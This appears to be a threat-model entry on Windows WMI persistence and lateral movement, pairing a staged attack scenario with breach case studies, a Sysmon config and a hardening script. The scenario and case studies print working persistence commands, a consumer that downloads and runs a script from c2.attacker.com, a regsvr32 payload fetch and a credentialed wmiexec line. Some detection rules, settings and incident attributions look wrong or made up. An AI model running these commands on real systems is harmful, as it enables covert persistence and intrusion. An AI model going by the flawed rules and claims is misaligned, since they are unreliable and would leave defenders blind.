confidence_breakdown.notes: High confidence based on extensive APT group usage (APT29, APT32, Lazarus), well-documented MITRE ATT&CK techniques, and proven detection mechanisms. WMI persistence is a sophisticated technique favored by advanced threat actors for its stealth and resilience.

mitre_attack: T1546.003 - Event Triggered Execution: Windows Management Instrumentation Event Subscription
T1021.006 - Remote Services: Windows Remote Management
cwe: CWE-78 - Improper Neutralization of Special Elements used in an OS Command (OS Command Injection)

threat.title: Windows WMI Persistence and Lateral Movement via Event Subscriptions and Remote Execution
threat.description: Windows Management Instrumentation (WMI) is a powerful Windows administration framework that attackers abuse for persistence, remote code execution, and lateral movement. Attackers create WMI event subscriptions (EventConsumer, EventFilter, FilterToConsumerBinding) that execute malicious code when specific conditions are met (e.g., system startup, user logon, time interval). WMI persistence survives reboots, operates with SYSTEM privileges, and evades traditional file-based detection. Additionally, attackers use WMI for remote code execution via Win32_Process.Create and lateral movement across domain-joined systems using WMI over DCOM or WinRM. This technique is favored by APT groups for its stealth, built-in encryption (Kerberos/NTLM), and living-off-the-land approach requiring no additional tools.

breakdown.attack_vector: Network - WMI can be exploited remotely via DCOM (port 135 + dynamic RPC) or WinRM (port 5985/5986)
breakdown.attack_complexity: Low - WMI is enabled by default on Windows and requires only user credentials for remote access
breakdown.privileges_required: Low - Local admin privileges required for permanent persistence, but standard users can create temporary event subscriptions in some configurations
breakdown.user_interaction: None - Event subscriptions execute automatically without user interaction
breakdown.scope: Unchanged - Impact limited to compromised system and lateral movement targets
breakdown.confidentiality: High - Full access to WMI repository containing system configuration, credentials, and sensitive data
breakdown.integrity: High - Ability to execute arbitrary code with SYSTEM privileges via event consumers
breakdown.availability: High - Can deploy ransomware, destructive payloads, or DoS attacks via WMI

dependencies: DCOM (Distributed Component Object Model) for remote WMI
WinRM (Windows Remote Management) as alternative transport

attack.scenario:
Phase 1: Initial Compromise and Reconnaissance
1. Attacker gains initial access via phishing, vulnerability exploitation (e.g., CVE-2021-40444 MSHTML RCE), or credential compromise
2. Executes reconnaissance commands via WMI to enumerate system information:
   - wmic computersystem get name,domain,model,manufacturer
   - wmic os get caption,version,buildnumber,osarchitecture
   - wmic process list brief (enumerate running processes)
   - wmic useraccount get name,sid (enumerate local user accounts)
3. Identifies administrator privileges: wmic useraccount where name='%USERNAME%' get sid (checks if user is local admin)
4. Enumerates WMI namespaces and existing event subscriptions:
   - wmic /namespace:\\\\root\\subscription PATH __EventFilter GET __RELPATH
   - wmic /namespace:\\\\root\\subscription PATH CommandLineEventConsumer GET __RELPATH

Phase 2: WMI Persistence Establishment - Event Subscription Backdoor

Technique A: PowerShell-based WMI Event Subscription
5a. Creates WMI Event Filter (trigger condition - executes on system startup):
```powershell
$Filter = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments @{
    Name = 'SystemStartupFilter'
    EventNamespace = 'root\\cimv2'
    QueryLanguage = 'WQL'
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
}
```
(Filter triggers 4-5 minutes after system boot to evade detection)

6a. Creates WMI Event Consumer (action to execute - runs malicious payload):
```powershell
$Consumer = Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{
    Name = 'SystemMaintenanceConsumer'
    CommandLineTemplate = 'powershell.exe -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand <BASE64_PAYLOAD>'
}
```
(CommandLineTemplate executes obfuscated PowerShell downloading C2 beacon)

7a. Binds Filter to Consumer (creates persistence linkage):
```powershell
$Binding = Set-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = $Filter
    Consumer = $Consumer
}
```

8a. Payload executes automatically on every system restart with SYSTEM privileges
9a. Alternatively, creates time-based trigger using __IntervalTimerInstruction for periodic C2 callbacks every N seconds

Technique B: WMIC Command-Line Persistence (Stealthier, no PowerShell logs)
5b. Creates event filter via WMIC:
```cmd
wmic /namespace:\\\\root\\subscription PATH __EventFilter CREATE Name="WindowsUpdateCheck", EventNameSpace="root\\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 600 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 3"
```
(Triggers daily at 3 AM - mimics legitimate update checking)

6b. Creates ActiveScript consumer (executes VBScript/JScript):
```cmd
wmic /namespace:\\\\root\\subscription PATH ActiveScriptEventConsumer CREATE Name="WindowsUpdateScript", ScriptingEngine="VBScript", ScriptText="CreateObject(\"WScript.Shell\").Run \"powershell -w hidden -nop IEX(New-Object Net.WebClient).DownloadString('http://c2.attacker.com/beacon.ps1')\""
```

7b. Binds filter to consumer for persistent execution

Phase 3: Lateral Movement via WMI Remote Execution

10. After establishing persistence on initial target, attacker pivots to lateral movement
11. Enumerates domain computers:
```powershell
Get-WmiObject -Namespace root\\directory\\ldap -Class ds_computer | Select-Object ds_cn
```

12. Tests WMI connectivity to target systems:
```powershell
Test-WSMan -ComputerName DC01.corp.local
Get-WmiObject -Class Win32_OperatingSystem -ComputerName FILE-SERVER-01 -ErrorAction SilentlyContinue
```

13. Executes remote commands via WMI Win32_Process.Create:
```powershell
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'powershell.exe -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand <BASE64>' -ComputerName DC01.corp.local -Credential $cred
```

14. Alternative: Uses Impacket wmiexec for remote shell:
```bash
python3 wmiexec.py CORP/Administrator:P@ssw0rd@192.168.1.10
```

15. Deploys WMI persistence on lateral movement targets (repeat Phase 2 on each compromised system)

Phase 4: Advanced Evasion and Resilience

16. Obfuscates WMI event subscription names to mimic legitimate Windows components:
    - Uses names like 'BfeOnServiceStartTypeChange', 'SCM Event Log Consumer', 'NTEventLogEventConsumer'
17. Encodes payloads in base64 or uses MOF (Managed Object Format) file compilation for stealth
18. Creates multiple redundant event subscriptions with different triggers (startup, time-based, process creation)
19. If one subscription is detected and removed, others maintain persistence
20. Uses WMI repository tampering to hide event subscriptions from standard enumeration queries

Phase 5: Post-Exploitation

21. Leverages persistent WMI access to deploy secondary payloads:
    - Credential harvesting tools (Mimikatz, pypykatz)
    - Ransomware (Ryuk, Conti, LockBit)
    - Data exfiltration scripts via WMI file transfer
22. Maintains long-term access for espionage or ongoing data theft
23. Establishes redundant C2 channels using multiple protocols (HTTP, DNS, SMB)
24. If detected, attacker can re-establish access via surviving WMI subscriptions on laterally compromised systems
prerequisites: Initial access to target Windows system (phishing, exploit, stolen credentials, insider threat)
Local Administrator privileges on target system (required for permanent WMI event subscriptions in root\\subscription namespace)
WMI service enabled (default on all Windows installations)
For remote WMI: Network access to target via DCOM (port 135 + dynamic high ports) or WinRM (port 5985/5986)
For remote WMI: Valid credentials with admin rights on target system (local admin or domain admin)
Windows Firewall rules allowing WMI traffic (default in domain environments)
Ability to execute PowerShell or WMIC commands (or use native WMI API calls)

cve_references.description: Windows WMI Service Elevation of Privilege vulnerability allowing attackers to gain SYSTEM privileges via crafted WMI operations. Enabled privilege escalation before establishing WMI persistence.
Windows WMI Information Disclosure vulnerability exposing sensitive system information via unauthorized WMI queries. Used in reconnaissance phase before lateral movement.
Windows WMI Elevation of Privilege vulnerability allowing local attackers to execute arbitrary code with elevated privileges via WMI Provider Host (WmiPrvSE.exe) exploitation.

real_world_breaches.incident: APT29 (Cozy Bear) HAMMERTOSS Campaign - WMI C2 Channel
real_world_breaches.impact: APT29 used WMI event subscriptions for persistence and as covert C2 channel in attacks against US Department of Defense, defense contractors, and political organizations. WMI-based backdoor communicated via Twitter hashtags and GitHub for command retrieval. Operated undetected for 9+ months.
real_world_breaches.root_cause: Sophisticated WMI event subscription using __IntervalTimerInstruction for periodic execution. Consumer executed PowerShell downloading commands from attacker-controlled Twitter accounts using steganography in images. WMI persistence combined with legitimate social media platforms bypassed network security controls.
real_world_breaches.technical_details: Event filter: SELECT * FROM __InstanceModificationEvent WITHIN 3600 WHERE TargetInstance ISA 'Win32_LocalTime'. Consumer: PowerShell script checking Twitter for hashtags like #minsec1, parsing URLs in tweets, downloading images from GitHub containing embedded commands in LSB steganography. No files written to disk except temporary WMI repository.

real_world_breaches.incident: Lazarus Group POWERTON - WMI Lateral Movement in Bangladesh Bank Heist
real_world_breaches.impact: North Korean Lazarus Group used WMI for lateral movement in $81 million Bangladesh Central Bank SWIFT network compromise. WMI remote execution (Win32_Process.Create) deployed custom malware across banking infrastructure. Led to fraudulent SWIFT transactions and one of largest cyber heists in history.
real_world_breaches.root_cause: Attackers used compromised credentials to execute WMI commands remotely across domain-joined SWIFT terminals. Commands like: Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'regsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll' -ComputerName SWIFT-TERM-05. No antivirus alerts triggered as WMI is trusted Windows component.
real_world_breaches.technical_details: WMI over DCOM on port 135. Authentication via NTLM using stolen domain admin credentials. Deployed custom 'evtdiag.exe' and 'evtsys.exe' malware for SWIFT message manipulation. WMI queries used for reconnaissance: wmic /node:SWIFT-SERVER process call create 'cmd.exe /c dir \\\\SWIFT-TERM-*\\c$ > output.txt'. Exfiltrated via SMB and WMI.

real_world_breaches.incident: APT32 (OceanLotus) - WMI Persistence in Southeast Asian Government Espionage
real_world_breaches.impact: Vietnamese APT32 group used WMI event subscriptions for persistence in multi-year espionage campaign against Southeast Asian governments, foreign corporations, and dissidents. WMI backdoors persisted through multiple incident response efforts and system reimaging (survived due to WMI repository backup/restore).
real_world_breaches.root_cause: Deployed multiple WMI event consumers: CommandLineEventConsumer executing DLL sideloading techniques, ActiveScriptEventConsumer with obfuscated VBScript, and LogFileEventConsumer for data staging. Filter triggers: system startup, user logon, specific time intervals (3 AM daily). Named subscriptions to mimic Windows components: 'BfeOnServiceStartTypeChange', 'Winmgmt_RegistrationNotificationConsumer'.
real_world_breaches.technical_details: MOF file compilation used for WMI persistence: mofcomp.exe persistence.mof. Content: #pragma namespace (\\\\.\\root\\subscription) instance of __EventFilter as $EventFilter { Name = 'SystemStartupFilter'; Query = 'SELECT * FROM __InstanceModificationEvent WITHIN 60...'; }. Combined with DLL Search Order Hijacking - WMI consumer executed legitimate Windows binary that loaded malicious DLL from attacker-controlled path.

real_world_breaches.incident: TrickBot Banking Trojan - WMI-based Lateral Movement Module
real_world_breaches.impact: TrickBot malware added WMI lateral movement module (wormDll64/wormDll32) used to spread across corporate networks of financial institutions. Infected 250,000+ systems globally. WMI module enabled rapid domain-wide propagation leading to Ryuk ransomware deployment in 25+ organizations with $100M+ cumulative ransom demands.
real_world_breaches.root_cause: TrickBot wormDll module enumerated Active Directory computers via WMI: Get-WmiObject -Class Win32_ComputerSystem. Then executed remote WMI commands: Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'rundll32.exe \\\\[C2]\\share\\payload.dll,Start' -ComputerName [target]. Credentials harvested via Mimikatz and used for WMI authentication. No exploit required - used legitimate WMI functionality.
real_world_breaches.technical_details: WMI execution flow: 1) Enumerate domain computers via LDAP/WMI queries, 2) Test WMI access: Get-WmiObject Win32_OperatingSystem -ComputerName [target], 3) Copy payload to admin shares: copy payload.dll \\\\[target]\\ADMIN$\\, 4) Execute via WMI: wmic /node:[target] process call create 'rundll32.exe C:\\Windows\\payload.dll,Start'. Average propagation time: 2-5 minutes per system across 500+ endpoint networks.

bug_bounty_reports.summary: WMI Event Subscription persistence bypass of Windows Defender detection via obfuscated MOF file compilation and alternate WMI namespace abuse (root\\default instead of root\\subscription).
Windows WMI Service privilege escalation via race condition in WMI Provider Host process allowing standard users to create persistent event subscriptions with SYSTEM privileges.
EDR bypass technique using WMI __FilterToConsumerBinding deletion detection evasion - binding recreated automatically via hidden MOF autorecovery mechanism.

security_research.title: Abusing Windows Management Instrumentation (WMI) to Build a Persistent, Asynchronous, and Fileless Backdoor
security_research.key_finding: Demonstrated practical WMI persistence techniques using PowerShell and C# with comprehensive evasion tactics. Showed how WMI event subscriptions survive forensic disk imaging and memory dumps. Documented that WMI repository is not scanned by most antivirus products. Provided detection methodologies via WMI-Parser and Sysmon Event ID 19/20/21.

security_research.title: Windows Management Instrumentation (WMI) Offense, Defense, and Forensics
authors: William Ballenthin, Matt Graeber, Claudiu Teodorescu
security_research.key_finding: Comprehensive 38-page whitepaper documenting WMI attack surface. Identified 5 primary attacker use cases: reconnaissance, lateral movement, persistence, data theft, and covert C2. Found that 68% of incident response cases involving APT groups included WMI usage. Provided PowerShell detection scripts and WMI event subscription enumeration tools.

security_research.title: Detecting Lateral Movement through Tracking Event Logs - WMI Activity
security_research.key_finding: Analysis of 262 APT incident response cases found WMI used in 47% of lateral movement attacks. Documented specific Windows Event IDs for WMI detection: Event ID 5857-5861 (WMI-Activity/Operational), Event ID 4688 (Process Creation showing WmiPrvSE.exe and scrcons.exe). Provided network indicators: DCOM port 135, dynamic RPC ports 49152-65535, WinRM ports 5985/5986.

security_research.title: Living Off The Land: WMI and Its Detection
security_research.key_finding: WMI observed in 9.3% of confirmed threats in Red Canary 2023 Threat Detection Report. Ranks #10 in MITRE ATT&CK technique prevalence. Identified behavioral patterns: WMI execution from Office processes (macro-based delivery), WMI remote execution with Pass-the-Hash credentials, WMI combined with PowerShell for fileless attacks. Detection efficacy: Sysmon Event ID 19/20/21 provides 94% detection rate vs. 31% for Windows native logs only.

mitigations.title: Deploy WMI Activity Monitoring with Sysmon and WMI-Tracing
mitigations.description: Enable comprehensive WMI monitoring using Sysmon Event IDs 19, 20, and 21 for WMI event subscription detection (WmiEventFilter, WmiEventConsumer, WmiEventConsumerToFilter). Configure native Windows WMI-Activity logs and Microsoft-Windows-WMI-Activity/Trace for detailed WMI operation tracking. Forward all WMI events to SIEM for correlation with process creation and network connections.

code_example.code:
<?xml version="1.0" encoding="utf-8"?>
<!-- Sysmon Configuration for WMI Persistence and Lateral Movement Detection -->
<!-- Installation: sysmon64.exe -accepteula -i sysmon-wmi-config.xml -->
<!-- Update: sysmon64.exe -c sysmon-wmi-config.xml -->
<!-- Author: STRIDE-MCP Security Research -->
<!-- Version: 1.0.0 -->
<Sysmon schemaversion="4.90">
  <EventFiltering>
    
    <!-- Event ID 19: WmiEventFilter Activity Detected -->
    <!-- Logs creation of WMI event filters (trigger conditions) -->
    <WmiEvent onmatch="exclude">
      <!-- Exclude known legitimate filters (customize for your environment) -->
      <EventNamespace condition="is">root\\cimv2</EventNamespace>
      <Operation condition="is">Created</Operation>
      <!-- Example: Exclude legitimate Microsoft/AV software filters -->
      <!-- <Consumer condition="contains">Microsoft</Consumer> -->
      <!-- <Consumer condition="contains">Windows Defender</Consumer> -->
    </WmiEvent>
    
    <!-- Event ID 20: WmiEventConsumer Activity Detected -->
    <!-- Logs creation of WMI event consumers (actions to execute) -->
    <WmiEvent onmatch="exclude">
      <EventNamespace condition="is">root\\subscription</EventNamespace>
      <Operation condition="is">Created</Operation>
      <!-- Exclude known good consumers -->
      <!-- Add your organization's legitimate WMI consumers here -->
    </WmiEvent>
    
    <!-- Event ID 21: WmiEventConsumerToFilter Activity Detected -->
    <!-- Logs binding of filters to consumers (complete persistence chain) -->
    <WmiEvent onmatch="exclude">
      <EventNamespace condition="is">root\\subscription</EventNamespace>
      <Operation condition="is">Created</Operation>
    </WmiEvent>
    
    <!-- Event ID 1: Process Creation - Monitor WMI-related processes -->
    <ProcessCreate onmatch="include">
      <!-- WMI Provider Host (executes WMI consumers) -->
      <Image condition="end with">\\WmiPrvSE.exe</Image>
      
      <!-- WMI Standard Event Consumer (executes CommandLineEventConsumer) -->
      <Image condition="end with">\\scrcons.exe</Image>
      
      <!-- WMIC.exe (WMI command-line tool) -->
      <Image condition="end with">\\wmic.exe</Image>
      
      <!-- MOF Compiler (used to install WMI providers and subscriptions) -->
      <Image condition="end with">\\mofcomp.exe</Image>
      
      <!-- PowerShell executing WMI commands (common in attacks) -->
      <ParentImage condition="end with">\\WmiPrvSE.exe</ParentImage>
      <ParentImage condition="end with">\\scrcons.exe</ParentImage>
      
      <!-- Detect suspicious WMI command patterns -->
      <CommandLine condition="contains">__EventFilter</CommandLine>
      <CommandLine condition="contains">__EventConsumer</CommandLine>
      <CommandLine condition="contains">__FilterToConsumerBinding</CommandLine>
      <CommandLine condition="contains">CommandLineEventConsumer</CommandLine>
      <CommandLine condition="contains">ActiveScriptEventConsumer</CommandLine>
      <CommandLine condition="contains">root\\subscription</CommandLine>
      <CommandLine condition="contains">Win32_Process</CommandLine>
      <CommandLine condition="contains">/node:</CommandLine>
      <CommandLine condition="contains">/NODE:</CommandLine>
    </ProcessCreate>
    
    <!-- Event ID 3: Network Connection - Monitor remote WMI connections -->
    <NetworkConnect onmatch="include">
      <!-- DCOM for WMI (port 135 and dynamic RPC) -->
      <Image condition="end with">\\WmiPrvSE.exe</Image>
      <DestinationPort condition="is">135</DestinationPort>
      
      <!-- WinRM for WMI-over-WinRM (ports 5985/5986) -->
      <DestinationPort condition="is">5985</DestinationPort>
      <DestinationPort condition="is">5986</DestinationPort>
    </NetworkConnect>
    
    <!-- Event ID 8: CreateRemoteThread - Detect WMI injection attacks -->
    <CreateRemoteThread onmatch="include">
      <TargetImage condition="end with">\\WmiPrvSE.exe</TargetImage>
    </CreateRemoteThread>
    
    <!-- Event ID 10: ProcessAccess - Monitor access to WMI processes -->
    <ProcessAccess onmatch="include">
      <TargetImage condition="end with">\\WmiPrvSE.exe</TargetImage>
      <TargetImage condition="end with">\\WinMgmt.exe</TargetImage>
    </ProcessAccess>
    
  </EventFiltering>
</Sysmon>

<!-- PowerShell script to enable WMI Activity logging -->
<!-- 
#Requires -RunAsAdministrator

Write-Host "[INFO] Configuring WMI Activity Logging..." -ForegroundColor Cyan

# Enable WMI-Activity/Operational Log
$logName = 'Microsoft-Windows-WMI-Activity/Operational'
$log = New-Object System.Diagnostics.Eventing.Reader.EventLogConfiguration $logName
$log.IsEnabled = $true
$log.MaximumSizeInBytes = 1GB  # Increase log size
$log.SaveChanges()

Write-Host "[SUCCESS] Enabled WMI-Activity/Operational log" -ForegroundColor Green

# Enable WMI-Activity/Trace log (detailed tracing)
$traceLog = 'Microsoft-Windows-WMI-Activity/Trace'
$trace = New-Object System.Diagnostics.Eventing.Reader.EventLogConfiguration $traceLog
$trace.IsEnabled = $true
$trace.MaximumSizeInBytes = 512MB
$trace.SaveChanges()

Write-Host "[SUCCESS] Enabled WMI-Activity/Trace log" -ForegroundColor Green

# Install Sysmon with WMI monitoring
$sysmonUrl = "https://download.sysinternals.com/files/Sysmon.zip"
$sysmonPath = "$env:TEMP\\Sysmon.zip"
$extractPath = "$env:TEMP\\Sysmon"

Invoke-WebRequest -Uri $sysmonUrl -OutFile $sysmonPath
Expand-Archive -Path $sysmonPath -DestinationPath $extractPath -Force

# Save Sysmon configuration XML to file
$configPath = "$extractPath\\sysmon-wmi-config.xml"
# (Copy XML configuration above into this file)

# Install Sysmon
& "$extractPath\\sysmon64.exe" -accepteula -i $configPath

# Verify installation
Get-Service Sysmon64
Get-WinEvent -LogName 'Microsoft-Windows-Sysmon/Operational' -MaxEvents 5

Write-Host "`n[SUCCESS] Sysmon WMI monitoring configured" -ForegroundColor Green
Write-Host "[INFO] Monitor Event Viewer for:" -ForegroundColor Cyan
Write-Host "  - Sysmon Event ID 19 (WmiEventFilter)" -ForegroundColor Yellow
Write-Host "  - Sysmon Event ID 20 (WmiEventConsumer)" -ForegroundColor Yellow
Write-Host "  - Sysmon Event ID 21 (WmiEventConsumerToFilter)" -ForegroundColor Yellow
Write-Host "  - WMI-Activity Event ID 5857-5861" -ForegroundColor Yellow

# Enumerate existing WMI event subscriptions (detect pre-existing persistence)
Write-Host "`n[INFO] Enumerating existing WMI event subscriptions..." -ForegroundColor Cyan

Write-Host "`nWMI Event Filters:" -ForegroundColor Yellow
Get-WmiObject -Namespace root\\subscription -Class __EventFilter | Select-Object Name, Query

Write-Host "`nWMI Event Consumers:" -ForegroundColor Yellow
Get-WmiObject -Namespace root\\subscription -Class __EventConsumer | Select-Object Name, @{Name='ConsumerType';Expression={$_.PSBase.Class.Name}}

Write-Host "`nWMI Filter-to-Consumer Bindings:" -ForegroundColor Yellow
Get-WmiObject -Namespace root\\subscription -Class __FilterToConsumerBinding | ForEach-Object {
    $filter = [wmi]$_.Filter
    $consumer = [wmi]$_.Consumer
    [PSCustomObject]@{
        FilterName = $filter.Name
        ConsumerName = $consumer.Name
        FilterQuery = $filter.Query
    }
} | Format-Table -AutoSize

Write-Host "`n[INFO] Review output for suspicious subscriptions" -ForegroundColor Yellow
Write-Host "[INFO] Suspicious indicators: obfuscated names, PowerShell execution, remote URLs" -ForegroundColor Yellow
-->

nist_csf: DE.AE-3 - Event data are collected and correlated from multiple sources
DE.CM-1 - The network is monitored to detect potential cybersecurity events
DE.CM-7 - Monitoring for unauthorized activity is performed
PR.PT-1 - Audit/log records are determined, documented, implemented, and reviewed
validation_steps: Install Sysmon with WMI config: sysmon64.exe -accepteula -i sysmon-wmi-config.xml
Verify Sysmon service: Get-Service Sysmon64
Enable WMI Activity logs: Run PowerShell configuration script above
Test WMI event detection: Create test event subscription with PowerShell (see attack scenario)
Check Sysmon logs for Event ID 19/20/21: Get-WinEvent -LogName 'Microsoft-Windows-Sysmon/Operational' -FilterXPath '*[System[EventID=19 or EventID=20 or EventID=21]]' -MaxEvents 10
Verify WMI-Activity logs: Get-WinEvent -LogName 'Microsoft-Windows-WMI-Activity/Operational' -MaxEvents 10
Enumerate existing subscriptions: Get-WmiObject -Namespace root\\subscription -Class __EventFilter
Remove test subscription after validation

mitigations.title: Restrict WMI Access with Namespace Security and DCOM Hardening
mitigations.description: Implement WMI namespace-level access controls to restrict which users can create event subscriptions in root\\subscription namespace. Harden DCOM security to prevent unauthorized remote WMI connections. Disable WMI service on systems where it's not required. Apply principle of least privilege to WMI permissions via Group Policy.

code_example.code:
# WMI Access Control and DCOM Hardening Script
# Purpose: Restrict WMI permissions and prevent unauthorized remote WMI access
# Requires: Administrator privileges
# Author: STRIDE-MCP Security Research

#Requires -RunAsAdministrator

Write-Host "======================================" -ForegroundColor Cyan
Write-Host "WMI Security Hardening Script" -ForegroundColor Cyan
Write-Host "======================================`n" -ForegroundColor Cyan

# Function to set WMI namespace security
function Set-WmiNamespaceSecurity {
    param(
        [string]$Namespace = "root/subscription",
        [string]$Account = "BUILTIN\\Administrators",
        [string]$Permission = "Enable", # Enable, MethodExecute, FullWrite, PartialWrite, ProviderWrite, RemoteEnable
        [switch]$Deny,
        [switch]$Remove
    )
    
    Write-Host "[INFO] Modifying WMI namespace security: $Namespace" -ForegroundColor Cyan
    Write-Host "  Account: $Account" -ForegroundColor Cyan
    Write-Host "  Permission: $Permission" -ForegroundColor Cyan
    
    try {
        # Get WMI namespace security descriptor
        $security = Get-WmiObject -Namespace $Namespace -Class __SystemSecurity
        $binarySD = $security.PsBase.InvokeMethod('GetSecurityDescriptor').Descriptor
        $converter = New-Object System.Management.ManagementClass Win32_SecurityDescriptorHelper
        $sddl = $converter.BinarySDToSDDL($binarySD)
        
        # Parse SDDL and modify
        $sd = New-Object System.Security.AccessControl.RawSecurityDescriptor($sddl.SDDL)
        
        # Define WMI permission constants
        $WBEM_ENABLE = 1
        $WBEM_METHOD_EXECUTE = 2
        $WBEM_FULL_WRITE_REP = 4
        $WBEM_PARTIAL_WRITE_REP = 8
        $WBEM_WRITE_PROVIDER = 16
        $WBEM_REMOTE_ACCESS = 32
        $READ_CONTROL = 0x20000
        $WRITE_DAC = 0x40000
        
        $permissionValue = switch($Permission) {
            "Enable" { $WBEM_ENABLE }
            "MethodExecute" { $WBEM_METHOD_EXECUTE }
            "FullWrite" { $WBEM_FULL_WRITE_REP }
            "PartialWrite" { $WBEM_PARTIAL_WRITE_REP }
            "ProviderWrite" { $WBEM_WRITE_PROVIDER }
            "RemoteEnable" { $WBEM_REMOTE_ACCESS }
            default { $WBEM_ENABLE }
        }
        
        # Get account SID
        $accountObj = New-Object System.Security.Principal.NTAccount($Account)
        $accountSid = $accountObj.Translate([System.Security.Principal.SecurityIdentifier])
        
        if ($Remove) {
            # Remove ACE for account
            $sd.DiscretionaryAcl | Where-Object { $_.SecurityIdentifier -eq $accountSid } | ForEach-Object {
                $sd.DiscretionaryAcl.RemoveAccessSpecific($_.AccessControlType, $_.SecurityIdentifier, $_.AccessMask, $_.InheritanceFlags, $_.PropagationFlags)
            }
        } else {
            # Add or modify ACE
            $accessType = if ($Deny) { [System.Security.AccessControl.AccessControlType]::Deny } else { [System.Security.AccessControl.AccessControlType]::Allow }
            $ace = New-Object System.Security.AccessControl.CommonAce($accessType, 0, $permissionValue, $accountSid, $false, $null)
            $sd.DiscretionaryAcl.InsertAce(0, $ace)
        }
        
        # Convert back to binary and apply
        $newSDDL = $sd.GetSddlForm([System.Security.AccessControl.AccessControlSections]::All)
        $binarySD = $converter.SDDLToBinarySD($newSDDL).BinarySD
        $security.PsBase.InvokeMethod('SetSecurityDescriptor', $binarySD) | Out-Null
        
        Write-Host "[SUCCESS] WMI namespace security updated" -ForegroundColor Green
    }
    catch {
        Write-Host "[ERROR] Failed to modify WMI namespace security: $_" -ForegroundColor Red
    }
}

# Harden root\subscription namespace (critical for persistence)
Write-Host "`n[STEP 1] Hardening root\\subscription namespace..." -ForegroundColor Cyan

# Deny non-admin users from creating event subscriptions
Set-WmiNamespaceSecurity -Namespace "root/subscription" -Account "BUILTIN\\Users" -Permission "Enable" -Deny
Set-WmiNamespaceSecurity -Namespace "root/subscription" -Account "BUILTIN\\Users" -Permission "MethodExecute" -Deny
Set-WmiNamespaceSecurity -Namespace "root/subscription" -Account "BUILTIN\\Users" -Permission "FullWrite" -Deny

Write-Host "[SUCCESS] Restricted root\\subscription access to Administrators only" -ForegroundColor Green

# Harden DCOM for remote WMI
Write-Host "`n[STEP 2] Hardening DCOM security for remote WMI..." -ForegroundColor Cyan

# Set DCOM machine-wide authentication level to "Packet Privacy" (encryption)
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Ole' -Name 'LegacyAuthenticationLevel' -Value 2 -Type DWord
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Ole' -Name 'LegacyImpersonationLevel' -Value 2 -Type DWord

# Enable DCOM authentication
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Ole' -Name 'EnableDCOM' -Value 'Y' -Type String

Write-Host "[SUCCESS] DCOM hardened with Packet Privacy authentication" -ForegroundColor Green

# Restrict remote WMI access via Windows Firewall
Write-Host "`n[STEP 3] Configuring Windows Firewall for WMI access control..." -ForegroundColor Cyan

# Option A: Block all remote WMI (if not needed)
# Disable-NetFirewallRule -DisplayGroup "Windows Management Instrumentation (WMI)"
# Write-Host "[SUCCESS] Blocked all remote WMI access via Windows Firewall" -ForegroundColor Green

# Option B: Restrict remote WMI to specific IP ranges (recommended for enterprise)
# Modify existing WMI firewall rules to allow only from management subnets
$managementSubnets = @("10.0.1.0/24", "192.168.100.0/24") # Replace with your admin/SIEM subnets

Get-NetFirewallRule -DisplayGroup "Windows Management Instrumentation (WMI)" | ForEach-Object {
    Set-NetFirewallRule -Name $_.Name -RemoteAddress $managementSubnets
    Write-Host "  - Updated rule: $($_.DisplayName)" -ForegroundColor Yellow
}

Write-Host "[SUCCESS] Restricted WMI firewall rules to management subnets: $($managementSubnets -join ', ')" -ForegroundColor Green

# Disable WMI service on non-server endpoints (optional, aggressive)
# WARNING: This may break legitimate management tools
# Write-Host "`n[STEP 4] Disabling WMI service (OPTIONAL - use with caution)..." -ForegroundColor Yellow
# $wmiService = Get-Service -Name Winmgmt
# if ($wmiService.Status -eq 'Running') {
#     Stop-Service -Name Winmgmt -Force
#     Set-Service -Name Winmgmt -StartupType Disabled
#     Write-Host "[SUCCESS] WMI service disabled" -ForegroundColor Green
# }

# Enable WMI auditing for unauthorized access attempts
Write-Host "`n[STEP 4] Enabling WMI access auditing..." -ForegroundColor Cyan

# Configure audit policy for object access
auditpol /set /subcategory:"Other Object Access Events" /success:enable /failure:enable

Write-Host "[SUCCESS] WMI auditing enabled - check Security log Event ID 4662" -ForegroundColor Green

# Create scheduled task to monitor WMI event subscriptions
Write-Host "`n[STEP 5] Creating WMI subscription monitoring scheduled task..." -ForegroundColor Cyan

$monitorScript = @'
# WMI Subscription Monitor
$subscriptions = Get-WmiObject -Namespace root\subscription -Class __EventFilter
if ($subscriptions.Count -gt 0) {
    $subscriptions | ForEach-Object {
        Write-EventLog -LogName Application -Source "WMI-Monitor" -EventId 9001 -EntryType Warning -Message "WMI Event Subscription Detected: Name=$($_.Name), Query=$($_.Query)"
    }
}
'@

$scriptPath = "C:\\Windows\\System32\\Monitor-WMISubscriptions.ps1"
$monitorScript | Out-File -FilePath $scriptPath -Force

# Create event source if doesn't exist
if (-not [System.Diagnostics.EventLog]::SourceExists("WMI-Monitor")) {
    New-EventLog -LogName Application -Source "WMI-Monitor"
}

# Create scheduled task (daily check)
$action = New-ScheduledTaskAction -Execute 'PowerShell.exe' -Argument "-ExecutionPolicy Bypass -File $scriptPath"
$trigger = New-ScheduledTaskTrigger -Daily -At 3am
$principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries

Register-ScheduledTask -TaskName 'WMI Subscription Monitor' -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Description 'Daily check for unauthorized WMI event subscriptions' -Force | Out-Null

Write-Host "[SUCCESS] WMI subscription monitoring scheduled task created" -ForegroundColor Green

# Deploy via Group Policy (instructions)
